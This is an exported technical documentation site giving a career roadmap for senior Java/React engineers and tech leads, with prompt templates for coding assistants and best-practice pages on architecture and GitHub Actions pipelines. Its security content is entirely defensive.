docs.title: Roadmap — Senior Java / React Engineer → Tech Lead
docs.text: A detailed map of what to master to become a senior full-stack Java / React engineer and step into tech lead roles. It covers coding, data, messaging, frontend, DevOps, security, architecture, system design, leadership and tooling, and links to the deeper pages of this site.

docs.title: How to use this roadmap
docs.text:
Marker Level Meaning 🟢 Mid → Senior Expected from any solid developer. Gaps here block everything else. 🟡 Senior What distinguishes a senior: depth, trade-offs, production experience. 🔴 Tech Lead Cross-team scope, architecture, decisions, people.
  • Depth over breadth. Master one tool per category deeply, know the alternatives by name and trade-offs.
  • Learn → build → explain. A topic is "done" when you have used it in a real project and can explain it to someone else.
  • Tick the checkboxes in the self-assessment at the end, and revisit every few months.
  • Production is the best teacher. Volunteer for on-call, incidents, migrations and performance issues.

docs.title: The big picture
docs.text:
Stage Scope Expected impact Signals you're ready for the next step 🟢 Mid A feature, a component Delivers well-defined tasks autonomously with good quality Needs little guidance, writes tests by default, debugs independently 🟡 Senior A service, a module, an epic Designs and delivers end-to-end, owns production, raises the bar Others ask for your review/opinion, you anticipate problems, you unblock people 🔴 Tech Lead A team / a system of services Sets technical direction, makes and communicates decisions, grows people Team delivers better because of you, not just through you; stakeholders trust your estimates

A senior is measured by the quality of what they build. A tech lead is measured by the quality of what the team builds.

docs.title: 1. Foundations — CS & principles
Computer science
docs.text: Topic Level What to know Data structures 🟢 Arrays, lists, hash maps, trees (BST, B-tree), heaps, graphs, tries Algorithms & complexity 🟢 Big-O time/space, sorting, searching, BFS/DFS, two pointers, sliding window, DP basics Networking 🟢 TCP vs UDP, DNS, HTTP/1.1 vs HTTP/2 vs HTTP/3, TLS handshake, cookies, CORS Operating systems 🟡 Processes vs threads, context switching, memory (stack/heap, virtual memory), file descriptors, I/O models Distributed systems basics 🟡 Latency numbers, clocks, partial failures, consensus (Raft) at a conceptual level

docs.title: Engineering principles
docs.text:
Principle Level Key idea SOLID 🟢 Especially SRP and DIP — they drive testability and modularity DRY / KISS / YAGNI 🟢 Duplication is cheaper than the wrong abstraction; don't build for "later" Composition over inheritance 🟢 Favour small collaborating objects over deep hierarchies Law of Demeter, Tell-don't-ask 🟡 Reduce coupling, push behaviour to where the data is Clean Code & naming 🟢 Code is read far more than written Refactoring 🟡 Small, safe, test-covered steps; know the catalogue (extract, inline, move…) Design patterns 🟡 GoF catalogue — and more importantly when not to use one Cohesion & coupling 🔴 The real metric behind every architecture decision Fail fast, least privilege, immutability by default 🟡 Defensive defaults that prevent whole classes of bugs

Go deeper: Design Patterns · Java best practices

Practice

  • Solve 2–3 algorithm problems a week (LeetCode / Codewars) — focus on explaining complexity out loud.
  • Take a legacy class, cover it with tests, then refactor it step by step.

docs.title: 2. Java backend track
Language & core APIs
docs.text: Topic Level What to know Modern Java (17 → 21 → 25) 🟢 Records, sealed types, pattern matching (switch, instanceof, record patterns), text blocks, var Collections 🟢 List/Set/Map implementations, complexity, equals/hashCode contract, immutable collections Streams & functional style 🟢 Lambdas, method refs, collectors, Optional done right, when a loop is clearer Generics 🟡 Bounded types, wildcards (PECS), type erasure Exceptions 🟢 Checked vs unchecked, exception translation, never swallow Concurrency 🟡 Java Memory Model, happens-before, volatile, locks, java.util.concurrent, CompletableFuture, thread pools sizing Virtual threads & structured concurrency 🟡 Loom model, pinning, when they help (I/O-bound) and when they don't JVM internals 🟡 Heap/stack/metaspace, class loading, JIT, GC (G1, ZGC, Shenandoah) and tuning basics Profiling & diagnostics 🔴 JFR, JDK Mission Control, async-profiler, heap dumps, thread dumps, jcmd

docs.title: Build & testing
docs.text: Topic Level What to know Maven / Gradle 🟢 Lifecycle, dependency management, BOMs, multi-module builds, plugins Unit testing 🟢 JUnit 5, AssertJ, Mockito — test behaviour, not implementation Integration testing 🟡 Testcontainers, @SpringBootTest slices (@WebMvcTest, @DataJpaTest) Architecture tests 🟡 ArchUnit rules to enforce layering and dependencies Contract testing 🔴 Spring Cloud Contract / Pact between services Mutation testing 🔴 PIT to measure the quality of tests, not just coverage TDD 🟡 Red → green → refactor; know when it pays off

docs.title: Spring ecosystem
docs.text:
Topic Level What to know Spring Core 🟢 IoC/DI, bean scopes and lifecycle, configuration, profiles Spring Boot 🟢 Auto-configuration, starters, externalized config, Actuator Proxies & AOP 🟡 JDK vs CGLIB proxies, self-invocation trap @Transactional 🟡 Propagation, isolation, rollback rules, where transactions don't apply Spring Data JPA / Hibernate 🟡 Entity lifecycle, N+1, fetch strategies, dirty checking, optimistic/pessimistic locking Spring Security 🟡 Filter chain, OAuth2 resource server, OIDC login, JWT, method security Spring MVC vs WebFlux 🟡 Blocking vs reactive, and why virtual threads changed the trade-off Validation & error handling 🟢 Bean Validation, @ControllerAdvice, Problem Details (RFC 9457) Spring Cloud / resilience 🔴 Config, gateway, Resilience4j (circuit breaker, retry, bulkhead)

Go deeper: Java Core & JVM · Spring & Architecture · Java notes · Java best practices · Spring Boot best practices · Testing · Testing best practices · Live Coding

Practice

  • Build a Spring Boot service with a clean layering, full test pyramid and Testcontainers.
  • Reproduce an N+1 problem and a @Transactional self-invocation bug, then fix them.
  • Profile a slow endpoint with JFR / async-profiler and write down what you found.

docs.title: 3. Data & persistence
docs.text:
Topic Level What to know SQL 🟢 Joins, aggregation, subqueries, CTEs, window functions Data modeling 🟢 Normalization (and when to denormalize), constraints, keys Indexes 🟡 B-tree vs hash/GIN/GiST, composite index ordering, covering indexes, EXPLAIN ANALYZE Transactions 🟡 ACID, isolation levels, anomalies (dirty/non-repeatable/phantom reads), MVCC, deadlocks PostgreSQL specifics 🟡 JSONB, partitioning, VACUUM, connection pooling (HikariCP, PgBouncer) Schema migrations 🟢 Flyway / Liquibase, backward-compatible (expand/contract) migrations ORM vs SQL mappers 🟡 JPA vs MyBatis vs jOOQ — pick by use case NoSQL families 🟡 Document (MongoDB), key-value (Redis), wide-column (Cassandra), search (Elasticsearch) — when each fits Caching 🟡 Cache-aside, write-through, TTL, invalidation, stampede protection Replication & sharding 🔴 Read replicas, replication lag, partitioning keys, rebalancing

Go deeper: Persistence & SQL

Practice

  • Take a slow query, read its plan, add the right index, measure before/after.
  • Run a zero-downtime column rename with expand/contract migrations.

docs.title: 4. Messaging, integration & APIs
docs.text:
Topic Level What to know REST API design 🟢 Resources, HTTP semantics, status codes, pagination, filtering, idempotent methods API contracts 🟢 OpenAPI, contract-first vs code-first, versioning strategies REST vs gRPC vs GraphQL 🟡 Trade-offs: coupling, performance, tooling, caching Kafka vs RabbitMQ 🟡 Log vs queue, partitions, consumer groups, ordering, retention Delivery semantics 🟡 At-most / at-least / exactly-once, and why idempotent consumers matter Transactional outbox & CDC 🔴 Avoid dual writes; Debezium Sagas 🔴 Orchestration vs choreography, compensating actions Schema evolution 🔴 Avro/Protobuf, Schema Registry, backward/forward compatibility Webhooks, retries, DLQs 🟡 Exponential backoff with jitter, poison messages, replay

Go deeper: Messaging · REST API best practices · Messaging best practices · Kafka & RabbitMQ notes

Practice

  • Implement the outbox pattern between a Spring service and Kafka, with an idempotent consumer.
  • Design and document a versioned public API with OpenAPI.

docs.title: 5. Frontend React track
JavaScript & TypeScript
docs.text: Topic Level What to know JS fundamentals 🟢 Scope, closures, this, prototypes, event loop, promises, async/await Modern JS 🟢 ES modules, destructuring, spread, optional chaining, immutability patterns TypeScript 🟢 Types vs interfaces, unions, narrowing, generics Advanced TypeScript 🟡 Utility & mapped types, conditional types, satisfies, discriminated unions, strict mode Browser 🟡 DOM, rendering pipeline, storage, fetch, Web APIs, service workers

docs.title: React
docs.text:
Topic Level What to know Components & hooks 🟢 useState, useEffect, useRef, useContext, custom hooks, rules of hooks Rendering model 🟡 Reconciliation, keys, when and why components re-render Performance 🟡 memo, useMemo, useCallback (and when they are useless), React Compiler, virtualization Effects done right 🟡 "You might not need an effect", cleanup, race conditions State management 🟡 Local vs lifted vs global; server state (TanStack Query) vs client state (Zustand / Redux Toolkit) Forms & validation 🟢 React Hook Form + Zod, controlled vs uncontrolled Routing & data loading 🟢 React Router / TanStack Router, loaders, code splitting Suspense, concurrent features 🟡 Suspense, transitions, error boundaries Server Components & frameworks 🔴 RSC model, Next.js, SSR vs SSG vs CSR trade-offs Styling 🟢 CSS fundamentals (flex, grid), CSS Modules / Tailwind, design systems Accessibility 🟡 Semantic HTML, WCAG, ARIA, keyboard navigation, screen reader testing Web performance 🟡 Core Web Vitals (LCP, INP, CLS), bundle analysis, lazy loading, image optimization Testing 🟢 Vitest/Jest, React Testing Library, MSW, Playwright for E2E Tooling 🟢 Vite, ESLint, Prettier, pnpm/npm, monorepos (Nx / Turborepo) Frontend security 🟡 XSS, CSP, CSRF, token storage, dependency hygiene Frontend architecture 🔴 Feature-based folders, shared UI library, micro-frontends (and their cost)

Go deeper: React & TypeScript · React best practices · Skill: vercel-react-best-practices

Practice

  • Build a React + TS app consuming your Spring API, with TanStack Query, forms, auth and E2E tests.
  • Audit it with Lighthouse and an accessibility checker; fix the top findings.

docs.title: 6. DevOps & cloud
docs.text:
Topic Level What to know Git 🟢 Branching, rebase vs merge, interactive rebase, bisect, trunk-based development, conventional commits Linux & shell 🟢 Processes, permissions, networking commands, grep/sed/awk/jq/curl CI/CD 🟢 GitHub Actions / GitLab CI, pipeline stages, caching, quality gates (SonarQube), artifact versioning Docker 🟢 Images vs containers, multi-stage builds, layer caching, distroless/minimal images, Compose Kubernetes 🟡 Pods, Deployments, Services, Ingress, ConfigMaps/Secrets, probes, resources/limits, HPA Helm / Kustomize 🟡 Packaging, values per environment, releases and rollbacks Infrastructure as Code 🟡 Terraform: state, modules, plan/apply, drift Cloud provider (pick one deep) 🟡 AWS / GCP / Azure: compute, managed DBs, queues, IAM, networking (VPC), storage Deployment strategies 🟡 Rolling, blue/green, canary, feature flags, dark launches Observability 🟡 Structured logs, metrics, distributed tracing, OpenTelemetry, Prometheus/Grafana, correlation IDs Reliability 🔴 SLI / SLO / error budgets, alerting on symptoms, capacity planning Incident management 🔴 On-call, runbooks, blameless postmortems GitOps & platform 🔴 Argo CD / Flux, internal developer platforms, golden paths

Go deeper: Full Stack & DevOps · Cloud (AWS) · Kubernetes notes · Docker notes · Git · Linux · curl & jq · Terraform

Practice

  • Containerize your full-stack app, deploy it on a local cluster (kind / k3d) with Helm.
  • Build a pipeline: lint → test → build image → scan → deploy to staging → smoke test.
  • Add OpenTelemetry tracing across frontend → backend → DB, and a Grafana dashboard with an SLO.

docs.title: 7. Security
docs.text:
Topic Level What to know OWASP Top 10 (Web & API) 🟢 Injection, broken access control, SSRF, security misconfiguration… Authentication 🟡 Sessions vs tokens, OAuth2 flows (Authorization Code + PKCE, Client Credentials), OIDC Authorization 🟡 RBAC vs ABAC, multi-tenancy, object-level checks Secrets management 🟡 Vault / cloud secret managers, never in git, rotation Supply chain 🟡 Dependency scanning (SCA), SBOM, image scanning (Trivy), pinning & updates (Renovate/Dependabot) Transport & data 🟡 TLS everywhere, encryption at rest, hashing passwords (bcrypt/Argon2), PII handling, GDPR Threat modeling 🔴 STRIDE, data-flow diagrams, security reviews as part of design Secure SDLC 🔴 SAST/DAST in pipelines, security champions, pentest follow-up

Go deeper: Security · Security best practices · System Design (OWASP section)

docs.title: 8. Architecture
docs.text:
Topic Level What to know Layered architecture 🟢 Controllers / services / repositories and their limits Hexagonal / Clean / Onion 🟡 Ports & adapters, dependency rule, framework at the edge Monolith → modular monolith → microservices 🔴 When to split (team topology, scaling, deployment independence) and when not to Domain-Driven Design — tactical 🟡 Entities, value objects, aggregates, domain events, repositories Domain-Driven Design — strategic 🔴 Ubiquitous language, bounded contexts, context mapping, event storming Event-driven architecture 🔴 Events vs commands, eventual consistency, choreography vs orchestration CQRS & event sourcing 🔴 Benefits, costs, and why most systems don't need them Quality attributes 🔴 Scalability, availability, maintainability, security — and trade-offs between them Documenting architecture 🔴 ADRs, C4 model, arc42, diagrams as code (Mermaid, PlantUML, Structurizr) Evolutionary architecture 🔴 Fitness functions, strangler fig, anti-corruption layer Technical debt 🔴 Identify, quantify, prioritize, negotiate time for it Team topologies & Conway's law 🔴 Architecture mirrors communication structure — design both

Go deeper: Spring & Architecture · Design Patterns · System Design · Architecture best practices

Practice

  • Refactor a service into hexagonal architecture and enforce it with ArchUnit.
  • Run an event storming session on a domain you know; derive bounded contexts.
  • Write 3 ADRs for real decisions in your current project.

docs.title: 9. System design
Method
docs.text:
1. Clarify requirements — functional, non-functional (load, latency, availability, consistency, compliance).
  2. Estimate — QPS, storage, bandwidth (back-of-the-envelope).
  3. API — main endpoints / events.
  4. Data model — entities, access patterns, storage choice.
  5. High-level design — components and flows.
  6. Deep dive — bottlenecks, failure modes, scaling each component.
  7. Trade-offs — what you chose, what you gave up, what you would do next.

docs.title: Building blocks
docs.text: Topic Level What to know Scaling 🟡 Vertical vs horizontal, stateless services, load balancing (L4 vs L7) Caching layers 🟡 Browser, CDN, gateway, application, database Data distribution 🔴 Replication (leader/follower, multi-leader), sharding, consistent hashing Consistency 🔴 CAP, PACELC, strong vs eventual consistency, read-your-writes Asynchronous processing 🟡 Queues, back-pressure, batch vs stream processing Resilience 🟡 Timeouts, retries with backoff + jitter, circuit breakers, bulkheads, graceful degradation Rate limiting 🟡 Token bucket, sliding window, where to enforce it Search & analytics 🔴 Inverted indexes, OLTP vs OLAP, data pipelines Multi-region 🔴 Active-passive vs active-active, data residency, failover

docs.title: Classic exercises
docs.text:
• URL shortener
  • Rate limiter
  • News feed / timeline
  • Chat / notification system
  • File storage (Dropbox-like)
  • E-commerce checkout & payments (idempotency, sagas)
  • Booking system (concurrency, double booking)
  • Metrics / logging pipeline

Go deeper: System Design

docs.title: 10. AI-assisted development
docs.text:
Topic Level What to know Using coding agents 🟢 Effective prompting, giving context, iterating with tests Reviewing AI output 🟡 Treat it as a junior's PR: verify, test, question Context engineering 🟡 Project instructions (CLAUDE.md), skills, MCP servers, hooks Team adoption & governance 🔴 Guidelines, security (secrets, prompt injection), measuring impact

Go deeper: AI Engineering & Claude Code

docs.title: 11. Tech lead skills — the non-code half
Technical leadership
docs.text: Skill What it looks like in practice Technical vision A written, shared direction for the next 6–12 months, aligned with the product Decision making RFCs / ADRs, one-way vs two-way doors, disagree-and-commit, decide with incomplete information Code review culture Fast, kind, focused reviews; clear conventions; automate the nitpicks Quality standards Definition of done, testing strategy, linting, CI gates Balancing debt vs features Make debt visible, tie it to business impact, reserve capacity Delivery Break down epics, identify risks early, deliver in thin vertical slices Estimation & planning Ranges not points, explicit assumptions, re-plan when facts change Operational ownership On-call health, incident leadership, postmortem follow-through Measuring DORA metrics (lead time, deploy frequency, change failure rate, MTTR)

docs.title: People & communication
docs.text:
Skill What it looks like in practice Mentoring & coaching Pairing, growth plans, giving stretch tasks, asking before telling Delegation Give problems, not solutions; don't take the critical path yourself Feedback Specific, timely, behaviour-focused (SBI model) Stakeholder communication Explain technical trade-offs in business terms; say no with alternatives Writing Clear design docs, status updates, decision records Facilitation Running design reviews, refinements, retrospectives that lead to action Conflict resolution Separate people from positions, align on goals, escalate cleanly Hiring Structured interviews, fair evaluation, onboarding plans Psychological safety Blameless culture, admitting your own mistakes, making it safe to ask

Go deeper: Leadership

Practice

  • Lead the design of one feature end-to-end: RFC → review → ADR → delivery → retro.
  • Mentor one person for 3 months with explicit goals.
  • Run a blameless postmortem and follow the action items to completion.

docs.title: 13. Suggested timeline
docs.text:
A realistic path while working full-time. Adjust to your starting point.

Phase Focus Milestone Months 0–3 Fill 🟢 gaps: modern Java, Spring fundamentals, SQL, TS/React basics, Git, Docker A tested full-stack app (Spring + React) running in Docker Compose Months 3–6 JVM & concurrency, JPA pitfalls, React performance, CI/CD, testing strategy Pipeline with quality gates; app deployed on Kubernetes with Helm Months 6–12 Messaging, observability, security, hexagonal + DDD tactical, system design practice Event-driven feature with outbox; tracing + SLO dashboard; 4 system design exercises done Months 12–18 Architecture (DDD strategic, ADRs, C4), cloud provider deep dive, leading features Led a feature from RFC to production; wrote ADRs; mentored someone Months 18–24 Tech lead skills: vision, planning, stakeholder management, incident leadership Owning a team's technical direction; recognized as go-to person across teams

docs.title: Self-assessment checklist
docs.text: This grid tracks your career level over months. For readiness the day before an interview, use the mock interview checklist.

docs.title: 🟢 Mid → Senior
docs.text:
• I can explain equals/hashCode, collections complexity and stream collectors without notes.
  • I write unit and integration tests by default, including with Testcontainers.
  • I can read an EXPLAIN ANALYZE plan and fix a missing index.
  • I know when a React component re-renders and how to avoid unnecessary renders.
  • I can write a Dockerfile with a multi-stage build and a CI pipeline from scratch.
  • I design REST APIs with correct HTTP semantics, validation and error format.
  • I use Git confidently: rebase, bisect, resolving conflicts.

docs.title: 🟡 Senior
docs.text:
• I can explain @Transactional propagation, proxy pitfalls and the N+1 problem — and fix them.
  • I can diagnose a memory leak or a thread contention issue with JVM tools.
  • I understand isolation levels and have handled a concurrency bug in production.
  • I choose between Kafka and RabbitMQ with clear arguments, and build idempotent consumers.
  • I have deployed and debugged services on Kubernetes (probes, resources, logs, events).
  • I instrument services with metrics, logs and traces and set meaningful alerts.
  • I can apply OWASP Top 10 mitigations and implement OAuth2/OIDC correctly.
  • I structure code with hexagonal architecture and DDD tactical patterns when they fit.
  • I can run a 45-minute system design interview end-to-end with explicit trade-offs.
  • My code reviews improve the code and teach the author.

docs.title: 🔴 Tech Lead
docs.text:
• I have written RFCs/ADRs that the team used to make decisions.
  • I can draw the C4 context and container diagrams of my system from memory.
  • I can decide whether to split a service — and argue against microservices when appropriate.
  • I have led an incident and a blameless postmortem.
  • I have defined SLOs and used error budgets to prioritize work.
  • I have a written technical roadmap aligned with product goals.
  • I translate technical trade-offs into business impact for non-technical stakeholders.
  • I mentor at least one engineer with explicit growth goals.
  • I track delivery health (DORA metrics) and act on it.
  • The team makes good decisions when I'm not in the room.

docs.title: AI Prompts for Senior Engineers
docs.text: Copy-paste prompts that get production-grade results from a coding assistant (Claude Code, Copilot Chat, etc.). Replace <...> with your own context.

docs.title: 🧱 Anatomy of a good prompt
State context, task, constraints, output and done-criteria
docs.text:
Tell the model what it cannot guess: the stack, the goal, the boundaries, the expected format, and how you will judge success.

Why it's a best practice: the model fills every gap with the statistically most common answer, not your answer. A senior engineer's edge is knowing the constraints (versions, conventions, SLAs); put them in the prompt and the output needs far less rework.

// ⛔ vague
Add caching to the user service.

// ✅ specific
Context: Spring Boot 3.3, Java 21, Postgres, Redis already configured (see CacheConfig.java).
Task: cache UserService.findById.
Constraints: Spring Cache abstraction only, TTL 5 min, evict on update/delete, no new dependencies.
Output: a diff + a test proving eviction works.
Done when: `./mvnw -q test -Dtest=UserServiceCacheTest` passes.

docs.title: Ask for a plan before code
docs.text:
For anything touching more than one file, ask for a plan and review it first.

Why it's a best practice: a wrong plan costs one minute to fix; a wrong 600-line diff costs an hour. Reviewing the approach is the cheapest checkpoint you have.

// ⛔
Migrate our auth to OAuth2.

// ✅
Do not write code yet. Read the security package and propose a migration plan to OAuth2 resource server:
files to change, order of steps, risks, what can be rolled back independently. Ask me questions if anything is ambiguous.

docs.title: 🔍 Understanding code
Trace a flow end to end
docs.text:
Ask for a concrete path with file references, not a summary.

Why it's a best practice: "explain this module" yields a generic description. A traced flow with file:line is verifiable and exposes the real coupling.

// ⛔
Explain the order module.

// ✅
Trace what happens from POST /orders to the row being committed and the event being published.
List each class/method in order with file:line, where the transaction starts/ends, and any place an exception
could leave data inconsistent.

docs.title: Map before you change
docs.text:
Ask for blast radius before editing shared code.

Why it's a best practice: most regressions come from callers you did not know existed.

Before I change the signature of PricingService.compute(), list every caller (including reflection, tests, and
config), what each passes, and which would break. Do not edit anything.

docs.title: 🏛️ Design & architecture
Ask for trade-offs, then a recommendation
docs.text:
Request options with costs, and force a decision.

Why it's a best practice: a single answer hides the alternatives; an unranked list pushes the decision back to you. Constraints make the recommendation relevant.

We need to send invoices asynchronously. Compare RabbitMQ, Kafka and a Postgres outbox for our case:
~50 msg/s, at-least-once is fine, 3-person team, already run Postgres only.
Table: ops cost, ordering, replay, failure modes. Then recommend one in 3 sentences and write the ADR
(context, decision, consequences).

docs.title: Make it challenge you
docs.text:
Ask for the strongest objections to your design.

Why it's a best practice: models are agreeable by default; explicit adversarial framing surfaces the flaws a reviewer would find later.

Here is my design <paste>. Act as a skeptical staff engineer. List the 5 most likely ways this fails in production
(scale, consistency, operability, security), ranked by likelihood x impact, and what you would change.

docs.title: 🛠️ Implementation
Point at an existing example to match
docs.text:
Reference a file that already follows your conventions.

Why it's a best practice: "follow the codebase style" is unmeasurable; "mirror OrderController" is concrete, and keeps the model from inventing new patterns or dependencies.

// ⛔
Write a controller for invoices.

// ✅
Add InvoiceController mirroring OrderController (error handling, DTO mapping, validation, @PreAuthorize).
Reuse ApiError and the existing MapStruct mappers. No new dependencies. Add a @WebMvcTest like OrderControllerTest.

docs.title: Drive it with tests
docs.text:
Give the failing test first, then ask for the minimal implementation.

Why it's a best practice: the test is an executable spec; the model can iterate until it is green instead of guessing.

Write failing tests for: a discount never exceeds 30%, stacking coupons is rejected, expired coupons are ignored.
Run them, confirm they fail for the right reason. Then implement the minimum to pass and run the whole module.

docs.title: 🐞 Debugging
Give evidence, ask for hypotheses, then a root cause
docs.text:
Paste the stack trace, repro steps, recent change and what you already ruled out.

Why it's a best practice: with only the symptom the model patches the symptom. Evidence plus a request for ranked hypotheses yields a fix at the cause.

// ⛔
My app throws NPE, fix it.

// ✅
Stack trace: <paste>. Happens only under load, started after commit <sha> (added async enrichment).
Already ruled out: null DB rows. Give 3 ranked hypotheses with how to confirm each (log, test, breakpoint).
After I confirm one, fix the root cause, not just the null check, and check other callers for the same bug.

docs.title: 🔎 Code review & refactoring
Review with a scope and a format
docs.text:
Limit what to look for and how to report.

Why it's a best practice: "review this" returns style nits. A narrow scope and severity ordering returns the few findings that matter.

Review this diff for correctness, concurrency and security only (no style). Max 7 findings, ordered by severity,
each with file:line, why it is wrong, and a fix. If nothing is wrong, say so.
<diff>...</diff>

docs.title: Refactor behind a safety net
docs.text:
Require tests to stay green and no behavior change.

Why it's a best practice: a refactor without a safety net is a rewrite in disguise.

Refactor OrderService.process() (300 lines) into smaller methods/collaborators. Behavior must not change:
first add characterization tests around current behavior, run them, then refactor in small steps, running tests
after each. No public API changes.

docs.title: 🧪 Testing
Ask for edge cases, not just the happy path
docs.text:
List the categories you want covered.

Why it's a best practice: the model's default tests mirror the implementation; naming categories pushes it to the boundaries where bugs live.

For parseAmount(String): write JUnit 5 parameterized tests covering null/blank, locale separators, negative,
overflow, rounding (HALF_EVEN), and unicode digits. Use AssertJ. Explain any behavior you had to assume.

docs.title: Diagnose flaky tests
docs.text:
Give the failure logs and how often it fails.

This test fails ~1 in 15 CI runs: <paste test + failure log>. List possible causes (shared state, time, ordering,
async), which evidence distinguishes them, then propose the fix that removes the cause rather than adding retries.

Why it's a best practice: retries hide the nondeterminism; a named cause removes it.

docs.title: 🗄️ SQL, JPA & performance
Bring the query plan
docs.text:
Paste the EXPLAIN (ANALYZE, BUFFERS) and the table sizes.

Why it's a best practice: performance advice without data is folklore. The plan shows the real bottleneck.

Postgres 16. Query and plan below, orders has 40M rows. Explain where the time goes, suggest indexes
(with the exact DDL and write-cost trade-off), and any rewrite. Do not suggest changes that alter results.
<query> <EXPLAIN ANALYZE output>

docs.title: Hunt N+1 and lazy-loading issues
docs.text:
Here is the JPA entity graph and the service method. Identify N+1 selects and lazy-loading outside a transaction.
Propose a fix (fetch join, @EntityGraph, or DTO projection) with the trade-offs, and a test using
Hibernate statistics to assert the query count.

Why it's a best practice: asking for a query-count assertion makes the fix provable and prevents regression.

docs.title: 🐳 DevOps & CI
Review infrastructure against a checklist
docs.text:
Review this Dockerfile and k8s Deployment for production: non-root user, pinned base image digest, layer caching,
resource requests/limits, liveness/readiness probes, graceful shutdown, secrets handling.
Give a table (issue, risk, fix) and then the corrected files.

Why it's a best practice: an explicit checklist stops the model from stopping at the first two obvious issues.

docs.title: 📝 Docs & communication
Generate from the diff, in your team's format
docs.text:
Write the PR description from this diff: what and why (2-3 sentences), risks, how to test, rollout/rollback plan.
Then draft the runbook entry for the new alert (symptom, dashboard, first 3 checks, escalation).

Why it's a best practice: the model is good at transforming facts you already have into the format your team wants; you still own the facts.

docs.title: ⚠️ Anti-patterns
docs.text:
• Pasting secrets, tokens or customer data. Redact; treat prompts as leaving your machine.
  • Accepting code you do not understand. Ask "explain why this is correct and what could break"; you own what you merge.
  • No verification step. Always end with "run the tests/linter and show the output".
  • One giant prompt for a big feature. Split: plan, then slice by slice, reviewing each diff.
  • Correcting by repetition. If the third attempt fails, restate the context or start a fresh session instead of arguing.
  • Asking for facts you can't check (library versions, APIs). Point it at the docs or the source in your repo.

docs.title: Architecture Best Practices
docs.text: Rules for structuring a Spring Boot codebase so it stays changeable. The interview questions are in Spring & Architecture and System Design.

docs.title: 📦 Structure
Package by feature, not by layer
docs.text:
Group code by business capability (order, billing, catalog), with controller, service and repository inside each feature package.

Why it's a best practice: controller/, service/ and repository/ folders put every feature in every folder, so one change touches four packages and nothing can be package-private. Feature packages keep related code together, make boundaries visible, and let you hide internals; they are also the natural seams if a module is extracted later.

// ⛔                         // ✅
controller/OrderController    order/OrderController
service/OrderService          order/OrderService
repository/OrderRepository    order/OrderRepository       (package-private where possible)
controller/InvoiceController  billing/InvoiceController

docs.title: Keep the domain free of framework code
docs.text:
Put business rules in plain classes that don't depend on HTTP, JPA or messaging; adapters at the edges translate. This is the core of hexagonal (ports and adapters) architecture.

Why it's a best practice: rules mixed with HttpServletRequest, @Entity lifecycle quirks or Kafka headers can only be tested with the whole framework running, and they change whenever the infrastructure changes. A pure domain is fast to unit test and survives a switch from REST to messaging, or from JPA to JDBC. Apply it where the business logic is rich; a simple CRUD service doesn't need the extra layers.

// ✅ domain decides, adapter persists
public class Order {
    public void cancel(Clock clock) {
        if (status == SHIPPED) throw new OrderAlreadyShipped(id);
        status = CANCELLED; cancelledAt = clock.instant();
    }
}

docs.title: Enforce boundaries with tests
docs.text:
Check dependency rules with ArchUnit or Spring Modulith in the normal test suite.

Why it's a best practice: architecture diagrams don't fail the build; an import from billing.internal into order, added under deadline pressure, triggers nothing until the modules are tangled. A rule test turns the intended structure into a check that every pull request runs.

// ✅
@ArchTest static final ArchRule domainIsPure =
    noClasses().that().resideInAPackage("..domain..")
               .should().dependOnClassesThat().resideInAnyPackage("org.springframework..", "jakarta.persistence..");

@Test void modulesRespectBoundaries() { ApplicationModules.of(App.class).verify(); }   // Spring Modulith

docs.title: 🧱 Domain modelling
Design aggregates around invariants, and reference others by id
docs.text:
An aggregate is the unit that must be consistent after each transaction (an order and its lines). Change one aggregate per transaction, and reference other aggregates by id rather than by object.

Why it's a best practice: large object graphs with bidirectional JPA associations load too much, lock too much and let any code change anything. Small aggregates keep invariants in one place (order.addLine() checks the limit), transactions short, and boundaries clear; cross-aggregate consistency goes through domain events, which also prepares a later split into services.

// ⛔ @ManyToOne Customer customer;  @OneToMany List<Invoice> invoices;   (whole graph reachable)
// ✅ private CustomerId customerId;  invoices are another aggregate, updated by an OrderPlaced event

docs.title: Use value objects instead of primitives for domain concepts
docs.text:
Wrap concepts such as Money, Email, OrderId in small immutable types (records) that validate themselves.

Why it's a best practice: BigDecimal amount, String currency lets anyone add euros to dollars, and (long customerId, long orderId) lets arguments be swapped without a compiler error. A value object makes invalid states unrepresentable and puts the rule in one place.

// ✅
public record Money(BigDecimal amount, Currency currency) {
    public Money { if (amount.scale() > currency.getDefaultFractionDigits()) throw new IllegalArgumentException(); }
    public Money plus(Money o) { requireSameCurrency(o); return new Money(amount.add(o.amount), currency); }
}

docs.title: 🧭 Decisions
Start with a modular monolith
docs.text:
Build one deployable with strong module boundaries, and extract a service only when there's a concrete reason: independent scaling, a separate team, a different release cadence or a different technology.

Why it's a best practice: microservices trade code complexity for distributed-systems complexity (network failures, eventual consistency, distributed tracing, many pipelines) before you know where the real boundaries are. Wrong boundaries in a monolith cost a refactor; wrong boundaries between services cost a migration. A well-modularized monolith keeps both options open.

docs.title: Record significant decisions in ADRs
docs.text:
Write a short Architecture Decision Record (context, decision, alternatives considered, consequences) in the repository for decisions that are expensive to reverse.

Why it's a best practice: six months later nobody remembers why Kafka was chosen over RabbitMQ or why a module talks to another through events, so decisions are re-argued or undone by accident. An ADR takes 20 minutes, is reviewed like code, and lets new team members understand the trade-offs instead of guessing.

docs/adr/0007-use-outbox-for-order-events.md
Status: Accepted · Context: dual writes lost events twice in Q2 · Decision: transactional outbox + Debezium
Alternatives: Kafka transactions (no DB coverage), listener after commit (still loses on crash)
Consequences: at-least-once, consumers must be idempotent; one more component to operate

docs.title: CI/CD with GitHub Actions Best Practices
docs.text: Image tagging, scanning and "build once, promote" are covered in Docker, K8s & DevOps. This page is about the pipeline itself.

docs.title: ⚙️ Pipeline design
Fail fast, cheapest checks first
docs.text:
Order jobs so that lint, compile and unit tests run before slow integration tests, image builds and deploys. Run independent jobs in parallel.

Why it's a best practice: a developer waiting 15 minutes to learn about a typo stops trusting the pipeline. Cheap checks give feedback in a minute and save the runner time of the expensive jobs. needs: expresses the order; everything without needs runs in parallel.

jobs:
  lint:   { runs-on: ubuntu-latest, steps: [ ... ] }
  unit:   { runs-on: ubuntu-latest, steps: [ ... ] }
  integration:
    needs: [lint, unit]          # only starts if the cheap jobs pass
    runs-on: ubuntu-latest
    steps: [ ... ]

docs.title: Cache dependencies and test on a matrix only where it matters
docs.text:
Use the built-in cache of the setup action, and a matrix for versions you actually support.

Why it's a best practice: downloading all Maven or npm dependencies on every run costs minutes for no reason. A matrix catches "works on 21, breaks on 25" but multiplies cost: don't matrix over things you don't ship.

unit:
  runs-on: ubuntu-latest
  strategy:
    matrix: { java: [21, 25] }
  steps:
    - uses: actions/setup-java@v4
      with: { distribution: temurin, java-version: "${{ matrix.java }}", cache: maven }

